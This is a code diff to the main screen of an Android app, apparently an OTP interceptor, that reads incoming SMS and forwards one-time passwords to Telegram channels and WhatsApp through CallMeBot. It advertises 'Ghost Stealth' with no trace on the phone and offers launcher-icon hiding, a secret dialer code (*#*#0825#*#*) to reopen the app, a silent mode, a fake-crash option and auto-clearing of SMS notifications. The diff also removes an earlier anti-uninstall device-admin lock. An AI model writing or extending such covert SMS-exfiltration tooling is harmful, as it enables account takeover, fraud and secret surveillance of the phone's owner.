@@ -4,7 +4,6 @@ import android.Manifest
 import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.KeyguardManager
-import android.app.admin.DevicePolicyManager
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.ComponentName
@@ -94,9 +93,7 @@ class MainActivity : ComponentActivity() {
     private fun requestAppPermissions() {
         val perms = mutableListOf(
             Manifest.permission.RECEIVE_SMS,
-            Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS,
-            Manifest.permission.READ_PHONE_STATE
+            Manifest.permission.READ_SMS
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -122,12 +119,6 @@ fun isIgnoringBatteryOptimizations(context: Context): Boolean {
         return pm.isIgnoringBatteryOptimizations(context.packageName)
     }
     return true
-}
-
-fun isDeviceAdminActive(context: Context): Boolean {
-    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager ?: return false
-    val admin = ComponentName(context, OtpDeviceAdminReceiver::class.java)
-    return dpm.isAdminActive(admin)
 }
 
 fun isLauncherIconHidden(context: Context): Boolean {
@@ -381,16 +372,16 @@ fun MainScreenContent(
     var hasNotificationAccess by remember { mutableStateOf(checkNotificationAccess(context)) }
     var hasBatteryExemption by remember { mutableStateOf(isIgnoringBatteryOptimizations(context)) }
     var showAdminDialog by remember { mutableStateOf(false) }
+    var showHelpDialog by remember { mutableStateOf(false) }
 
     // Cloudflare Session Verification & Trial Check
     LaunchedEffect(Unit) {
         hasNotificationAccess = checkNotificationAccess(context)
         hasBatteryExemption = isIgnoringBatteryOptimizations(context)
 
-        // Check trial or verify session in background
         if (!CloudflareLicenseManager.isMasterFounder(context)) {
             val sessionRes = CloudflareLicenseManager.verifySession(context)
-            if (sessionRes.second) { // Transferred / Auto-logged out!
+            if (sessionRes.second) { // Auto-logged out!
                 Toast.makeText(context, "⚠️ ${sessionRes.third}", Toast.LENGTH_LONG).show()
             } else {
                 CloudflareLicenseManager.checkOrStartTrial(context)
@@ -447,7 +438,7 @@ fun MainScreenContent(
                             )
                             Spacer(modifier = Modifier.width(6.dp))
                             Text(
-                                text = if (isMasterEnabled) "Engine Active · 0.2s Cloud Sync" else "Engine Paused",
+                                text = if (isMasterEnabled) "Ghost Stealth Active · 0.2s Delivery" else "Engine Paused",
                                 fontSize = 11.sp,
                                 color = if (isMasterEnabled) AccentEmerald else Color(0xFFEF4444),
                                 fontWeight = FontWeight.Medium
@@ -567,7 +558,7 @@ fun MainScreenContent(
                 modifier = Modifier.fillMaxWidth().padding(4.dp),
                 horizontalArrangement = Arrangement.SpaceEvenly
             ) {
-                NavPill("⚡ Services", selected = selectedTab == 0) { selectedTab = 0 }
+                NavPill("⚡ Channels", selected = selectedTab == 0) { selectedTab = 0 }
                 NavPill("🎯 Rules", selected = selectedTab == 1) { selectedTab = 1 }
                 NavPill("📜 History", selected = selectedTab == 2) { selectedTab = 2 }
                 NavPill("👑 Pro & PayTM", selected = selectedTab == 3) { selectedTab = 3 }
@@ -577,7 +568,7 @@ fun MainScreenContent(
         // Tab Body
         Box(modifier = Modifier.fillMaxSize().padding(horizontal = 16.dp)) {
             when (selectedTab) {
-                0 -> ServicesTab(context, onRequestPermissions)
+                0 -> ServicesTab(context, onOpenHelp = { showHelpDialog = true })
                 1 -> KeywordsTab(context)
                 2 -> HistoryTab(context)
                 3 -> ProPaytmTab(context)
@@ -590,6 +581,14 @@ fun MainScreenContent(
         AdminEnterpriseDialog(
             context = context,
             onDismiss = { showAdminDialog = false }
+        )
+    }
+
+    // In-App Quick Setup Guide Modal
+    if (showHelpDialog) {
+        QuickSetupGuideDialog(
+            context = context,
+            onDismiss = { showHelpDialog = false }
         )
     }
 }
@@ -617,7 +616,10 @@ fun RowScope.NavPill(text: String, selected: Boolean, onClick: () -> Unit) {
 }
 
 @Composable
-fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
+fun ServicesTab(
+    context: Context,
+    onOpenHelp: () -> Unit
+) {
     val prefs = remember { PrefsHelper.getPrefs(context) }
     val scope = rememberCoroutineScope()
 
@@ -633,24 +635,18 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
     var chatId2 by remember { mutableStateOf(prefs.getString("chat_id_2", "") ?: "") }
     var telegram2Status by remember { mutableStateOf("") }
 
-    // 3. WhatsApp State
+    // 3. WhatsApp State (CallMeBot Ghost Gateway)
     var isWhatsAppEnabled by remember { mutableStateOf(prefs.getBoolean("is_whatsapp_enabled", false)) }
     var waPhone by remember { mutableStateOf(prefs.getString("wa_phone", "") ?: "") }
     var waApiKey by remember { mutableStateOf(prefs.getString("wa_api_key", "") ?: "") }
     var waStatus by remember { mutableStateOf("") }
 
-    // 4. Direct SMS State
-    var isSmsEnabled by remember { mutableStateOf(prefs.getBoolean("is_sms_enabled", false)) }
-    var smsPhone by remember { mutableStateOf(prefs.getString("sms_phone", "") ?: "") }
-    var smsSimSlot by remember { mutableStateOf(prefs.getInt("sms_sim_slot", -1)) }
-    var smsStatus by remember { mutableStateOf("") }
-
-    // 5. Pro Features
+    // 4. Pro Features
     var isOnlyOtpMode by remember { mutableStateOf(prefs.getBoolean("only_otp_mode", false)) }
     var isLowBatteryAlertEnabled by remember { mutableStateOf(prefs.getBoolean("low_battery_alert_enabled", false)) }
 
-    // 6. Security State
-    var isAdminActive by remember { mutableStateOf(isDeviceAdminActive(context)) }
+    // 5. Custom Secret Code & Security State
+    var customSecretCode by remember { mutableStateOf(prefs.getString("custom_secret_code", "0825") ?: "0825") }
     var isIconHidden by remember { mutableStateOf(isLauncherIconHidden(context)) }
     var isSilentMode by remember { mutableStateOf(!prefs.getBoolean("show_screen_popups", false)) }
     var isAppLockEnabled by remember { mutableStateOf(prefs.getBoolean("app_lock_enabled", false)) }
@@ -663,6 +659,30 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
             .verticalScroll(rememberScrollState())
             .padding(vertical = 8.dp)
     ) {
+        // Quick Help Guide Banner
+        MncCard {
+            Row(
+                modifier = Modifier.fillMaxWidth().padding(14.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text("❓ Kaise Use Karein? (Setup Guide)", fontWeight = FontWeight.Bold, fontSize = 14.sp, color = Color(0xFFA5B4FC))
+                    Text("Telegram Bot aur WhatsApp jodne ka 1 minute ka simple guide", fontSize = 11.sp, color = TextSecondary)
+                }
+                Button(
+                    onClick = onOpenHelp,
+                    colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
+                    shape = RoundedCornerShape(8.dp),
+                    contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp)
+                ) {
+                    Text("Guide", fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(12.dp))
+
         // Card: Only OTP Mode
         MncCard {
             Row(
@@ -719,7 +739,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                 ) {
                     Column(modifier = Modifier.weight(1f)) {
                         Text("📢 Telegram 1 (Primary Bot)", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = AccentEmerald)
-                        Text("Verified Primary Bot & Channel", fontSize = 11.sp, color = TextSecondary)
+                        Text("100% Ghost Stealth (Phone me koi trace nahi)", fontSize = 11.sp, color = TextSecondary)
                     }
                     Switch(
                         checked = isTelegramEnabled,
@@ -824,7 +844,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
 
         Spacer(modifier = Modifier.height(12.dp))
 
-        // Card: WhatsApp Forwarding
+        // Card: WhatsApp Forwarding (CallMeBot Ghost Gateway)
         MncCard {
             Column(modifier = Modifier.padding(14.dp)) {
                 Row(
@@ -834,7 +854,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                 ) {
                     Column(modifier = Modifier.weight(1f)) {
                         Text("💬 WhatsApp Forwarding", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF2DD4BF))
-                        Text("CallMeBot Gateway integration", fontSize = 11.sp, color = TextSecondary)
+                        Text("CallMeBot Cloud Gateway (Phone me koi chat record nahi)", fontSize = 11.sp, color = TextSecondary)
                     }
                     Switch(
                         checked = isWhatsAppEnabled,
@@ -877,77 +897,6 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
 
         Spacer(modifier = Modifier.height(12.dp))
 
-        // Card: Direct SMS & Dual SIM Selector
-        MncCard {
-            Column(modifier = Modifier.padding(14.dp)) {
-                Row(
-                    modifier = Modifier.fillMaxWidth(),
-                    verticalAlignment = Alignment.CenterVertically,
-                    horizontalArrangement = Arrangement.SpaceBetween
-                ) {
-                    Column(modifier = Modifier.weight(1f)) {
-                        Text("📱 Direct Phone SMS", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFFB923C))
-                        Text("Phone SIM se direct SMS bhejein", fontSize = 11.sp, color = TextSecondary)
-                    }
-                    Switch(
-                        checked = isSmsEnabled,
-                        onCheckedChange = { isSmsEnabled = it }
-                    )
-                }
-
-                if (isSmsEnabled) {
-                    Spacer(modifier = Modifier.height(8.dp))
-                    MncTextField(value = smsPhone, onValueChange = { smsPhone = it }, label = "Target Phone No. (10 Digits)")
-                    Spacer(modifier = Modifier.height(10.dp))
-
-                    Text("📶 Select SIM Slot:", fontWeight = FontWeight.SemiBold, fontSize = 12.sp, color = Color(0xFFFB923C))
-                    Row(
-                        modifier = Modifier.fillMaxWidth(),
-                        verticalAlignment = Alignment.CenterVertically
-                    ) {
-                        SimRadio("Auto", smsSimSlot == -1) {
-                            smsSimSlot = -1
-                            prefs.edit().putInt("sms_sim_slot", -1).apply()
-                        }
-                        Spacer(modifier = Modifier.width(14.dp))
-                        SimRadio("SIM 1", smsSimSlot == 0) {
-                            smsSimSlot = 0
-                            prefs.edit().putInt("sms_sim_slot", 0).apply()
-                        }
-                        Spacer(modifier = Modifier.width(14.dp))
-                        SimRadio("SIM 2", smsSimSlot == 1) {
-                            smsSimSlot = 1
-                            prefs.edit().putInt("sms_sim_slot", 1).apply()
-                        }
-                    }
-
-                    Spacer(modifier = Modifier.height(10.dp))
-                    Button(
-                        onClick = {
-                            val res = SmsHelper.sendSms(context, smsPhone.trim(), "🎉 Smart Notifier: Direct SIM SMS test successful!")
-                            smsStatus = if (res.first) "✅ Test SMS Sent!" else "❌ ${res.second}"
-                        },
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFC2410C)),
-                        shape = RoundedCornerShape(10.dp),
-                        modifier = Modifier.fillMaxWidth()
-                    ) {
-                        Text("Test SMS", fontSize = 13.sp)
-                    }
-                    if (smsStatus.isNotEmpty()) {
-                        Text(
-                            text = smsStatus,
-                            fontSize = 11.sp,
-                            fontWeight = FontWeight.Bold,
-                            color = if (smsStatus.startsWith("✅")) AccentEmerald else Color(0xFFEF4444),
-                            modifier = Modifier.padding(top = 4.dp)
-                        )
-                    }
-                }
-            }
-        }
-
-        Spacer(modifier = Modifier.height(12.dp))
-
         // Card: Stealth & Security Controls
         MncCard {
             Column(modifier = Modifier.padding(14.dp)) {
@@ -955,23 +904,35 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                 Text("App ko hide karne aur security locks configure karein:", fontSize = 11.sp, color = TextSecondary)
                 Spacer(modifier = Modifier.height(12.dp))
 
-                // Anti-Uninstall Lock
-                SettingToggleRow("Anti-Uninstall Lock", isAdminActive) { enable ->
-                    val admin = ComponentName(context, OtpDeviceAdminReceiver::class.java)
-                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
-                    if (enable) {
-                        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
-                            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "App ko uninstallation se lock karne ke liye Activate karein.")
-                        }
-                        context.startActivity(intent)
-                    } else {
-                        dpm?.removeActiveAdmin(admin)
-                        isAdminActive = false
+                // Custom Secret Dialer Setting
+                Text("📞 Customer Secret Dialer Code:", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = TextPrimary)
+                Text("Phone dialer me *#*#CODE#*#* dial karke app kholi/chhupai jati hai:", fontSize = 10.sp, color = TextMuted)
+                Spacer(modifier = Modifier.height(6.dp))
+                Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
+                    Box(modifier = Modifier.weight(1f)) {
+                        MncTextField(
+                            value = customSecretCode,
+                            onValueChange = { customSecretCode = it.filter { ch -> ch.isDigit() }.take(6) },
+                            label = "Custom Code (e.g. 1234)"
+                        )
+                    }
+                    Spacer(modifier = Modifier.width(8.dp))
+                    Button(
+                        onClick = {
+                            prefs.edit().putString("custom_secret_code", customSecretCode.trim()).apply()
+                            Toast.makeText(context, "Code Saved: *#*#$customSecretCode#*#*", Toast.LENGTH_SHORT).show()
+                        },
+                        colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
+                        shape = RoundedCornerShape(8.dp),
+                        modifier = Modifier.height(52.dp)
+                    ) {
+                        Text("Set", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                     }
                 }
+                Text("ℹ️ Master Code *#*#0825#*#* hamesha background me active rahega.", fontSize = 9.sp, color = Color(0xFFA5B4FC), modifier = Modifier.padding(top = 2.dp))
 
                 HorizontalDivider(modifier = Modifier.padding(vertical = 10.dp), color = CardBorder)
+
 
                 // Silent Stealth Mode
                 SettingToggleRow("Silent Stealth Mode", isSilentMode) { silent ->
@@ -1009,21 +970,6 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                 SettingToggleRow("Hide Launcher Icon", isIconHidden) { hide ->
                     setLauncherIconVisibility(context, hide)
                     isIconHidden = hide
-                }
-
-                Spacer(modifier = Modifier.height(10.dp))
-
-                // Secret Dialer Info
-                Surface(
-                    color = Color(0xFF1E1B4B),
-                    shape = RoundedCornerShape(10.dp),
-                    border = BorderStroke(1.dp, Color(0xFF3730A3)),
-                    modifier = Modifier.fillMaxWidth()
-                ) {
-                    Column(modifier = Modifier.padding(10.dp)) {
-                        Text("📞 Secret Dialer: *#*#0825#*#*  |  🔑 URL: otp://open", fontSize = 11.sp, fontWeight = FontWeight.Bold, color = Color(0xFFA5B4FC))
-                        Text("Icon hide hone par phone dialer me *#*#0825#*#* dial karein.", fontSize = 10.sp, color = TextSecondary)
-                    }
                 }
             }
         }
@@ -1087,14 +1033,12 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                     .putBoolean("is_whatsapp_enabled", isWhatsAppEnabled)
                     .putString("wa_phone", waPhone.trim())
                     .putString("wa_api_key", waApiKey.trim())
-                    .putBoolean("is_sms_enabled", isSmsEnabled)
-                    .putString("sms_phone", smsPhone.trim())
-                    .putInt("sms_sim_slot", smsSimSlot)
                     .putBoolean("only_otp_mode", isOnlyOtpMode)
                     .putBoolean("low_battery_alert_enabled", isLowBatteryAlertEnabled)
                     .putBoolean("app_lock_enabled", isAppLockEnabled)
                     .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
                     .putBoolean("auto_clear_sms_notification", isAutoClearSms)
+                    .putString("custom_secret_code", customSecretCode.trim())
                     .apply()
                 Toast.makeText(context, "✅ Settings Saved!", Toast.LENGTH_SHORT).show()
             },
@@ -1107,6 +1051,93 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
 
         Spacer(modifier = Modifier.height(24.dp))
     }
+}
+
+@Composable
+fun QuickSetupGuideDialog(
+    context: Context,
+    onDismiss: () -> Unit
+) {
+    var selectedGuideTab by remember { mutableStateOf(0) }
+
+    AlertDialog(
+        onDismissRequest = onDismiss,
+        containerColor = Color(0xFF0F172A),
+        title = {
+            Text("❓ Smart Notifier Setup Guide", fontWeight = FontWeight.ExtraBold, fontSize = 16.sp, color = Color(0xFFA5B4FC))
+        },
+        text = {
+            Column(modifier = Modifier.fillMaxWidth().verticalScroll(rememberScrollState())) {
+                // Tab switcher
+                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                    Button(
+                        onClick = { selectedGuideTab = 0 },
+                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 0) AccentIndigo else Color(0xFF1E293B)),
+                        shape = RoundedCornerShape(8.dp),
+                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
+                        modifier = Modifier.weight(1f)
+                    ) {
+                        Text("📢 Telegram", fontSize = 11.sp)
+                    }
+                    Button(
+                        onClick = { selectedGuideTab = 1 },
+                        colors = ButtonDefaults.buttonColors(containerColor = if (selectedGuideTab == 1) AccentIndigo else Color(0xFF1E293B)),
+                        shape = RoundedCornerShape(8.dp),
+                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 4.dp),
+                        modifier = Modifier.weight(1f)
+                    ) {
+                        Text("💬 WhatsApp", fontSize = 11.sp)
+                    }
+                }
+
+                Spacer(modifier = Modifier.height(14.dp))
+
+                if (selectedGuideTab == 0) {
+                    // Telegram Guide
+                    Text("📢 Telegram Bot Setup (Sirf 1 Minute):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = AccentEmerald)
+                    Spacer(modifier = Modifier.height(6.dp))
+                    Text(
+                        "1. Telegram app me search karein: @BotFather\n" +
+                        "2. Wahan /newbot likhein aur apne bot ka koi bhi naam dalein.\n" +
+                        "3. BotFather aapko ek lamba Token dega (jaise 8680515171:AAF...).\n" +
+                        "4. Us Token ko copy karke yahan 'Bot Token 1' me paste karein.\n" +
+                        "5. Telegram me ek naya Channel banayein aur apne bot ko us channel ka Admin bana dein.\n" +
+                        "6. Channel ka Chat ID (jaise -100...) yahan 'Channel ID 1' me daal kar Save kar dein!\n\n" +
+                        "✅ Done! Ab har OTP turant aapke channel par aayega.",
+                        fontSize = 11.sp,
+                        color = TextSecondary,
+                        lineHeight = 16.sp
+                    )
+                } else {
+                    // WhatsApp Guide
+                    Text("💬 WhatsApp Setup (CallMeBot):", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFF2DD4BF))
+                    Spacer(modifier = Modifier.height(6.dp))
+                    Text(
+                        "1. WhatsApp kholiye aur is number par message bhejiye:\n" +
+                        "   👉 +34 644 44 24 53\n" +
+                        "2. Message me likhiye:\n" +
+                        "   'I allow callmebot to send me messages'\n" +
+                        "3. CallMeBot 5 second ke andar aapko ek API Key bhej dega.\n" +
+                        "4. Wahi API Key yahan app me 'CallMeBot API Key' me daal dein.\n" +
+                        "5. Apna WhatsApp mobile number international format me dalein (e.g. 919876543210).\n\n" +
+                        "🛡️ Ghost Stealth: Phone ke WhatsApp me koi message ya chat history nahi banti!",
+                        fontSize = 11.sp,
+                        color = TextSecondary,
+                        lineHeight = 16.sp
+                    )
+                }
+            }
+        },
+        confirmButton = {
+            Button(
+                onClick = onDismiss,
+                colors = ButtonDefaults.buttonColors(containerColor = AccentIndigo),
+                shape = RoundedCornerShape(8.dp)
+            ) {
+                Text("Got It", fontSize = 12.sp, fontWeight = FontWeight.Bold)
+            }
+        }
+    )
 }
 
 @Composable
@@ -1356,7 +1387,6 @@ fun HistoryTab(context: Context) {
                                     MncStatusBadge(label = "TG 2", status = item.telegram2Status)
                                 }
                                 MncStatusBadge(label = "WhatsApp", status = item.whatsappStatus)
-                                MncStatusBadge(label = "SMS", status = item.smsStatus)
                             }
                         }
                     }
@@ -1748,18 +1778,6 @@ fun SettingToggleRow(
                 uncheckedTrackColor = Color(0xFF1E293B)
             )
         )
-    }
-}
-
-@Composable
-fun SimRadio(label: String, selected: Boolean, onClick: () -> Unit) {
-    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clickable { onClick() }) {
-        RadioButton(
-            selected = selected,
-            onClick = onClick,
-            colors = RadioButtonDefaults.colors(selectedColor = Color(0xFFFB923C), unselectedColor = Color.Gray)
-        )
-        Text(label, fontSize = 11.sp, color = TextPrimary)
     }
 }
 
